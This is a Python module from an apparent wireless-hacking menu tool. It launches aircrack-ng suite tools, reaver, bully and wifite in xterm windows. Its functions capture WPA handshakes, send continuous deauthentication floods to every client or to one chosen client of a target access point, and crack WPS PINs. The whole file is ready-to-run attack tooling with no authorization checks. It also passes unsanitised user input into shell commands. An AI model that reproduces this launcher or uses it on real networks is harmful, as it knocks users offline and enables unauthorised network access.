import os # For os.system, to be replaced
import time
import subprocess # For direct subprocess.run where xterm logic is more complex
from .utils import TextColor, InputColor, run_command, clear_screen

def get_handshake(selected_interface):
    if not selected_interface:
        print(f"{TextColor.RED}[!] No interface selected for handshake capture.{TextColor.RESET}")
        return

    clear_screen()
    print(f"{TextColor.PURPLE}--- Capture Handshake on {selected_interface} ---{TextColor.RESET}")
    print(f"{TextColor.CYAN}\n[*] First, airodump-ng will run to help you identify target BSSID and channel.{TextColor.RESET}")
    print(f"{TextColor.CYAN}[*] When done identifying, press [CTRL+C] in the airodump-ng window.{TextColor.RESET}")
    print(f"{TextColor.CYAN}[*] Note: Under Probe, it might capture passwords if clients try to connect openly.")
    print(f"{TextColor.YELLOW}[*] Don't attack networks if Data is ZERO (likely out of range or inactive).{TextColor.RESET}")
    print(f"{TextColor.CYAN}[*] In airodump-ng, you can use 's' to change sorting.{TextColor.RESET}")
    
    airodump_cmd_scan = f"sudo xterm -hold -e airodump-ng {selected_interface} -M"
    print(f"{TextColor.YELLOW}Starting network discovery: {airodump_cmd_scan}{TextColor.RESET}")
    # Using subprocess.call for xterm as it's simpler for fire-and-forget GUI windows
    # and we want to wait for it if it's -hold. Using Popen to not block if not -hold.
    # For simplicity of refactor, let's assume user closes xterm.
    subprocess.Popen(airodump_cmd_scan, shell=True)
    print(f"{TextColor.GREEN}Airodump-ng started in a new window. Identify your target.{TextColor.RESET}")
    
    # Wait for user to identify and close, or provide input here.
    # The original script didn't wait, it launched and then immediately asked for BSSID.
    # This means the user has to quickly switch back and forth or note it down.

    try:
        bssid = input(f"{InputColor.BOLD}{InputColor.BLUE}[?] Enter the BSSID of the target: {InputColor.RESET}").strip()
        channel_str = input(f"{InputColor.BOLD}{InputColor.BLUE}[?] Enter the channel of the target network: {InputColor.RESET}").strip()
        channel = int(channel_str)
        path_prefix = input(f"{InputColor.BOLD}{InputColor.BLUE}[?] Enter the path and prefix for the output file (e.g., /tmp/handshake_capture): {InputColor.RESET}").strip()
        
        print(f"{InputColor.BOLD}{InputColor.BLUE}[?] Enter number of deauth packets to send [1-10000] (0 for continuous, many for targeted attack):{InputColor.RESET}")
        print(f"{TextColor.CYAN}[*] The number of packets depends on distance and if clients are connected.{TextColor.RESET}")
        print(f"{TextColor.CYAN}[*] A small number (e.g., 5-20) can deauth a client to force re-connection.{TextColor.RESET}")
        dist_str = input(f"{InputColor.BOLD}{InputColor.BLUE}Number of deauth packets: {InputColor.RESET}").strip()
        dist = int(dist_str)

    except ValueError:
        print(f"{TextColor.RED}[!] Invalid input. Please enter numbers for channel and packets.{TextColor.RESET}")
        return
    except KeyboardInterrupt:
        print(f"\n{TextColor.YELLOW}[!] Handshake capture cancelled by user.{TextColor.RESET}")
        return

    # Command to capture handshake on specific BSSID/channel and save to file
    airodump_capture_cmd = f"sudo xterm -e airodump-ng --bssid {bssid} -c {channel} -w {path_prefix} {selected_interface}"
    
    # Command to send deauth packets to the AP (broadcast deauth) to try and force a client to reconnect
    # Sending to broadcast (FF:FF:FF:FF:FF:FF) is less effective than targeting a specific client.
    # The original command deauthenticates the AP's clients, which is what we want for handshake.
    aireplay_deauth_cmd = f"sudo xterm -e aireplay-ng --deauth {dist} -a {bssid} {selected_interface}"

    print(f"\n{TextColor.CYAN}[*] Starting airodump-ng to capture on BSSID {bssid}, Channel {channel}. Output: {path_prefix}*")
    print(f"{TextColor.CYAN}[*] Simultaneously, starting aireplay-ng to send {dist} deauth packets to {bssid}.")
    print(f"{TextColor.YELLOW}[!] Close the aireplay-ng window after it finishes, then watch airodump-ng for WPA Handshake.{TextColor.RESET}")
    print(f"{TextColor.YELLOW}[!] Once handshake is captured (top right in airodump-ng window), you can close both windows.{TextColor.RESET}")

    try:
        # Run airodump-ng in one xterm
        airodump_proc = subprocess.Popen(airodump_capture_cmd, shell=True)
        print(f"{TextColor.GREEN}[+] Airodump-ng for capture started (PID: {airodump_proc.pid}).{TextColor.RESET}")
        
        time.sleep(5) # Give airodump some time to start listening properly

        # Run aireplay-ng in another xterm
        if dist > 0: # Only run deauth if packets are specified
            aireplay_proc = subprocess.Popen(aireplay_deauth_cmd, shell=True)
            print(f"{TextColor.GREEN}[+] Aireplay-ng for deauthentication started (PID: {aireplay_proc.pid}).{TextColor.RESET}")
        else:
            print(f"{TextColor.YELLOW}[*] Skipping deauthentication as packet count is 0.{TextColor.RESET}")

        print(f"\n{InputColor.BOLD}{InputColor.MAGENTA}Monitoring... Press Ctrl+C here in THIS terminal (not xterm) if you want to stop monitoring and return to menu prematurely (xterm windows may remain).{InputColor.RESET}")
        # This allows the main script to be interrupted if needed, without auto-closing xterms.
        # User should manually close xterm windows when done.
        while True: # Loop here so this script doesn't exit before user is done.
            time.sleep(10) # Check periodically or just wait for user to Ctrl+C here
            # A more advanced version would monitor airodump_proc.poll() but that's complex for xterm.
            print(f"{TextColor.CYAN}Still capturing... Check xterm windows. Press CTRL+C in this window to return to menu.{TextColor.RESET}")
    except KeyboardInterrupt:
        print(f"\n{TextColor.YELLOW}[!] Handshake capture process interrupted by user in main terminal. Please close xterm windows manually.{TextColor.RESET}")
    except Exception as e:
        print(f"{TextColor.RED}[ERROR] An error occurred: {e}{TextColor.RESET}")
    finally:
        print(f"{TextColor.GREEN}[+] Handshake capture session ended. Check {path_prefix} files.{TextColor.RESET}")
        input(f"{TextColor.YELLOW}Press Enter to return to the main menu...{TextColor.RESET}")


def deauth_all_clients(selected_interface):
    clear_screen()
    print(f"{TextColor.PURPLE}--- Deauthenticate All Clients on a Network ---{TextColor.RESET}")
    print(f"{TextColor.CYAN}[*] First, airodump-ng will run to help you identify target BSSID.{TextColor.RESET}")
    print(f"{TextColor.CYAN}[*] When done identifying, press [CTRL+C] in the airodump-ng window.{TextColor.RESET}")
    
    airodump_cmd_scan = f"sudo xterm -hold -e airodump-ng {selected_interface} -M" # -M might be optional
    subprocess.Popen(airodump_cmd_scan, shell=True)
    print(f"{TextColor.GREEN}Airodump-ng started. Identify your target BSSID, then close the xterm window.{TextColor.RESET}")

    try:
        target_bssid = input(f"{InputColor.BOLD}{InputColor.BLUE}Enter the BSSID of the target network: {InputColor.RESET}").strip()
        if not target_bssid:
            print(f"{TextColor.RED}[!] BSSID cannot be empty.{TextColor.RESET}")
            return
    except KeyboardInterrupt:
        print(f"\n{TextColor.YELLOW}[!] Deauthentication cancelled.{TextColor.RESET}")
        return

    print(f"{TextColor.GREEN}[+] Starting Deauthentication attack on all clients of {target_bssid}...{TextColor.RESET}")
    print(f"{TextColor.YELLOW}[!] This will run continuously. Press [CTRL+C] in the new xterm window to stop.{TextColor.RESET}")
    time.sleep(1)
    
    # 0 means continuous deauth packets
    deauth_cmd = f"sudo xterm -e aireplay-ng --deauth 0 -a {target_bssid} {selected_interface}"
    try:
        # Using Popen so this script doesn't block, user controls xterm
        subprocess.Popen(deauth_cmd, shell=True)
        print(f"{TextColor.GREEN}[+] Deauthentication attack initiated in a new window.{TextColor.RESET}")
        input(f"{TextColor.YELLOW}Attack is running in a separate window. Press Enter here to return to menu (attack will continue).{TextColor.RESET}")
    except Exception as e:
        print(f"{TextColor.RED}[ERROR] Failed to start deauthentication attack: {e}{TextColor.RESET}")


def deauth_one_client(selected_interface):
    clear_screen()
    print(f"{TextColor.PURPLE}--- Deauthenticate a Specific Client ---{TextColor.RESET}")
    print(f"{TextColor.CYAN}[*] First, airodump-ng will run. Note the BSSID of the AP and the MAC of the client (STATION).{TextColor.RESET}")
    print(f"{TextColor.CYAN}[*] When done identifying, press [CTRL+C] in the airodump-ng window.{TextColor.RESET}")

    airodump_cmd_scan = f"sudo xterm -hold -e airodump-ng {selected_interface} -M"
    subprocess.Popen(airodump_cmd_scan, shell=True)
    print(f"{TextColor.GREEN}Airodump-ng started. Identify target BSSID and Client MAC, then close the xterm window.{TextColor.RESET}")

    try:
        target_bssid = input(f"{InputColor.BOLD}{InputColor.BLUE}[?] Enter the BSSID of the target network: {InputColor.RESET}").strip()
        client_mac = input(f"{InputColor.BOLD}{InputColor.BLUE}[?] Enter the MAC address of the client to deauthenticate: {InputColor.RESET}").strip()
        if not target_bssid or not client_mac:
            print(f"{TextColor.RED}[!] BSSID and Client MAC cannot be empty.{TextColor.RESET}")
            return
    except KeyboardInterrupt:
        print(f"\n{TextColor.YELLOW}[!] Deauthentication cancelled.{TextColor.RESET}")
        return

    print(f"{TextColor.GREEN}[+] Starting Deauthentication attack on client {client_mac} connected to {target_bssid}...{TextColor.RESET}")
    print(f"{TextColor.YELLOW}[!] This will run continuously. Press [CTRL+C] in the new xterm window to stop.{TextColor.RESET}")
    time.sleep(1)

    deauth_cmd = f"sudo xterm -e aireplay-ng --deauth 0 -a {target_bssid} -c {client_mac} {selected_interface}"
    try:
        subprocess.Popen(deauth_cmd, shell=True)
        print(f"{TextColor.GREEN}[+] Deauthentication attack initiated in a new window.{TextColor.RESET}")
        input(f"{TextColor.YELLOW}Attack is running in a separate window. Press Enter here to return to menu (attack will continue).{TextColor.RESET}")
    except Exception as e:
        print(f"{TextColor.RED}[ERROR] Failed to start deauthentication attack: {e}{TextColor.RESET}")


def deauth_main(selected_interface):
    if not selected_interface:
        print(f"{TextColor.RED}[!] No interface selected for deauthentication attacks.{TextColor.RESET}")
        input(f"{InputColor.BOLD}{InputColor.BLUE}Press Enter to Continue..{InputColor.RESET}")
        return

    while True:
        clear_screen()
        print(f"{TextColor.PURPLE}--- Deauthentication Attack Options (using {selected_interface}) ---{TextColor.RESET}")
        print("1. Deauthenticate all clients on a network")
        print("2. Deauthenticate one specific client")
        print("0. Back to Main Menu")
        choice = input(f"\n{InputColor.BOLD}{InputColor.BLUE}Choose an option: {InputColor.RESET}")

        if choice == "1":
            deauth_all_clients(selected_interface)
            break 
        elif choice == "2":
            deauth_one_client(selected_interface)
            break
        elif choice == "0":
            break 
        else:
            print(f"{TextColor.RED}[!] Invalid choice.{TextColor.RESET}")
            input(f"{InputColor.BOLD}{InputColor.BLUE}Press Enter to Continue..{InputColor.RESET}")
        # No recursive call to intro(), just loop or break

def wps_network_attacks(selected_interface):
    if not selected_interface:
        print(f"{TextColor.RED}[!] No interface selected for WPS attacks.{TextColor.RESET}")
        input(f"{InputColor.BOLD}{InputColor.BLUE}Press Enter to Continue..{InputColor.RESET}")
        return

    clear_screen()
    print(f"{TextColor.PURPLE}--- WPS Network Attacks (using {selected_interface}) ---{TextColor.RESET}")
    print(f"{TextColor.YELLOW}[!] These attacks require an external Wi-Fi adapter that supports monitor mode and packet injection.{TextColor.RESET}")
    print(f"{TextColor.YELLOW}[!] Ensure {selected_interface} is in monitor mode if required by the tool.{TextColor.RESET}")
    print("""
1) Reaver (Attack WPS PIN)
2) Bully (Attack WPS PIN, alternative to Reaver)
3) Wifite (Automated audit tool - Recommended for broad WPS/WPA attacks)
4) PixieWps with Reaver (Offline WPS PIN attack if vulnerable)

0) Back to Main Menu
    """)
    
    try:
        attack_choice_str = input(f"{InputColor.BOLD}{InputColor.BLUE}[+] Choose the attack type: {InputColor.RESET}")
        attack_choice = int(attack_choice_str)
    except ValueError:
        print(f"{TextColor.RED}[!] Invalid input. Please enter a number.{TextColor.RESET}")
        input(f"{InputColor.BOLD}{InputColor.BLUE}Press Enter to Continue..{InputColor.RESET}")
        return
    except KeyboardInterrupt:
        print(f"\n{TextColor.YELLOW}[!] WPS attack selection cancelled.{TextColor.RESET}")
        return

    # Common inputs
    bssid = ""
    channel_str = ""
    channel = 0
    
    # Wifite runs on its own, doesn't need BSSID/channel upfront here
    if attack_choice in [1, 2, 4]:
        print(f"{TextColor.CYAN}[*] You may need to run a WPS scan first (Main Menu option 11) to identify targets.{TextColor.RESET}")
        try:
            bssid = input(f"{InputColor.BOLD}{InputColor.BLUE}[?] Enter the BSSID of the WPS-enabled network: {InputColor.RESET}").strip()
            if not bssid:
                print(f"{TextColor.RED}[!] BSSID cannot be empty for this attack.{TextColor.RESET}")
                return
            if attack_choice == 2: # Bully often needs channel
                channel_str = input(f"{InputColor.BOLD}{InputColor.BLUE}[?] Enter the channel of the network (optional for some, required for Bully): {InputColor.RESET}").strip()
                if channel_str: channel = int(channel_str) # Bully requires channel

        except ValueError:
            print(f"{TextColor.RED}[!] Invalid channel format.{TextColor.RESET}")
            return
        except KeyboardInterrupt:
            print(f"\n{TextColor.YELLOW}[!] Input cancelled.{TextColor.RESET}")
            return


    command_to_run = ""
    if attack_choice == 1: # Reaver
        # Ensure selected_interface is the monitor mode interface, e.g., wlan0mon
        command_to_run = f"sudo xterm -e reaver -i {selected_interface} -b {bssid} -vv"
    elif attack_choice == 2: # Bully
        if not channel_str: # Bully usually needs channel
             print(f"{TextColor.RED}[!] Bully requires the channel. Please provide it.{TextColor.RESET}")
             return
        command_to_run = f"sudo xterm -e bully -b {bssid} -c {channel} {selected_interface}" # Removed --pixiewps, let user add flags if needed via custom cmd later
    elif attack_choice == 3: # Wifite
        print(f"{TextColor.CYAN}[*] Starting Wifite... It will guide you through interface selection and attacks.{TextColor.RESET}")
        command_to_run = "sudo wifite" # Wifite handles interface selection internally
    elif attack_choice == 4: # PixieWps with Reaver
        command_to_run = f"sudo xterm -e reaver -i {selected_interface} -b {bssid} -K 1 -vv" # -K 1 is one way to invoke PixieDust
    elif attack_choice == 0:
        return # Back to main menu
    else:
        print(f"{TextColor.RED}[!] Invalid attack choice.{TextColor.RESET}")
        input(f"{InputColor.BOLD}{InputColor.BLUE}Press Enter to Continue..{InputColor.RESET}")
        return

    if command_to_run:
        print(f"{TextColor.GREEN}[+] Launching: {command_to_run}{TextColor.RESET}")
        print(f"{TextColor.YELLOW}[!] Attack will run in a new window. Monitor its progress there.{TextColor.RESET}")
        try:
            # For tools like wifite, xterm might not be needed if they are TUI based
            if attack_choice == 3: # Wifite
                 run_command(command_to_run, display_output=True) # Wifite runs in current console better
            else:
                 subprocess.Popen(command_to_run, shell=True)
            input(f"{TextColor.YELLOW}Attack/Tool is running. Press Enter here to return to the menu (it will continue in its window/process).{TextColor.RESET}")
        except Exception as e:
            print(f"{TextColor.RED}[ERROR] Failed to start WPS attack: {e}{TextColor.RESET}")
            input(f"{InputColor.BOLD}{InputColor.BLUE}Press Enter to Continue..{InputColor.RESET}")